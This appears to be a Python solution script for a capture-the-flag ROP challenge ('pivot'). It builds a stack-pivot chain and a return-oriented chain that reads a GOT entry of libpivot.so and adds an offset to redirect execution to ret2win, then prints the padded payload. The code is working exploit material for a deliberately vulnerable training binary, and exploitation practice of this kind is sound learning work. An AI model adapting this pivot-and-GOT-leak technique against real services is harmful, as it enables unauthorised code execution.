import struct
import pdb

def stringpacker(addr):

    return str(struct.pack("<Q",addr))

# foothold_function / ret2win addresses and offsets
foothold_function = 0x400850 # foothold_function@plt
'''
rabin2 -s libpivot.so | grep -E "ret2win|foothold"
addr=0x00000abe off=0x00000abe ord=049 fwd=NONE sz=26 bind=GLOBAL type=FUNC name=ret2win
addr=0x00000970 off=0x00000970 ord=057 fwd=NONE sz=24 bind=GLOBAL type=FUNC name=foothold_function

'''
ret2win_function_offset = 0xabe - 0x970
foothold_function_got_plt = 0x000000602048



# gadgets
pop_rax = 0x0000000000400b00 # pop rax; ret
xchg_esp_rax = 0x0000000000400b02 # xchg esp,rax; ret
mov_rax_ptrrax = 0x0000000000400b05  # mov rax, QWORD PTR [rax]; ret
add_rax_rbp = 0x0000000000400b09 # add rax,rbp; ret
pop_rbp = 0x0000000000400900 # pop rbp; ret
call_rax = 0x000000000040098e # call rax

begin_payload = 0x7ffff7809f10 # this is where our payload will be stored at


# step 0: stack pivot chain

stackpivotchain = ""
stackpivotchain += stringpacker(pop_rax)
stackpivotchain += stringpacker(begin_payload)
stackpivotchain += stringpacker(xchg_esp_rax)

# step 1: call foothold_function

ropchain = ""
ropchain += stringpacker(foothold_function)

# step 2: overwrite foothold function

ropchain += stringpacker(pop_rax)
ropchain += stringpacker(foothold_function_got_plt) # rax holds now the address of the foothold_function got plt entry
ropchain += stringpacker(mov_rax_ptrrax) # rax contains now the contents of the foothold_function got plt entry
ropchain += stringpacker(pop_rbp) # rbp contains now the offset to the ret2win function
ropchain += stringpacker(ret2win_function_offset)
ropchain += stringpacker(add_rax_rbp) # rax contains now the final address to the ret2win function
ropchain += stringpacker(call_rax)

payload = ropchain
payload += (295 - len(ropchain)) *"B" # filler bytes to reach the point of RIP control
payload += stackpivotchain

print(payload)


